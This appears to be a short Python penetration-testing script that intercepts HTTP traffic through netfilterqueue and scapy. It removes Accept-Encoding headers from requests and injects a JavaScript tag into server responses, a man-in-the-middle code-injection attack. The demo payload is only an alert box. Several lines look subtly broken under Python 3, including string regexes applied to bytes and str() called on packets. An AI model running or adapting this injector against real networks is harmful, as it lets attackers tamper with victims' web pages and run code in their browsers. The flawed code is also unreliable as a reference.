#!/usr/bin/env python3
# Rebuild - View README for testing parameters.
import netfilterqueue
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import Raw
import re

AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
replace_load = ""

# Take our modified load and set it to the packet load
def set_load(packet, load):
    packet[Raw].load = load
    # For scapy to recalculate IP and Chksum for updated load, delete them
    # Making the change from del, to *= None, does not affect the results
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    if packet.haslayer(UDP):
        del packet[UDP].len
        del packet[UDP].chksum
    return packet

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        load = scapy_packet[Raw].load
        if scapy_packet.haslayer(TCP):
            # print("\n[+] Packet has layer TCP")
            if scapy_packet[TCP].dport == 80:
                print("[+] HTTP Request:  ")
                # Find "Accept-Encoding" in payload, replace with ""
                load = re.sub(
                    "Accept-Encoding:.*?\\r\\n",
                    "",
                    load,
                    flags=re.IGNORECASE | re.MULTILINE
                )
            elif scapy_packet[TCP].sport == 80:
                print("[+] HTTP Response:  ")
                # invoke python method replace to replace a string with another string
                load = load.replace("</body>", "<script>alert('Test!'); </script></body>")
                # This works with http://www.pentest-standard.org/ and allows page to load
                # modified_load = scapy_packet[Raw].load.replace("</head>", "<script>alert('Test!'); </script></head>")
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(str(new_packet))

            # if load updated, set the load to new_packet, set new_packet as packet
            if load != scapy_packet[Raw].load:
                # Create a new packet
                new_packet = set_load(scapy_packet, load)
                # set the new packet with the updated payload as the packet
                packet.set_payload(str(new_packet))

    packet.accept()


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
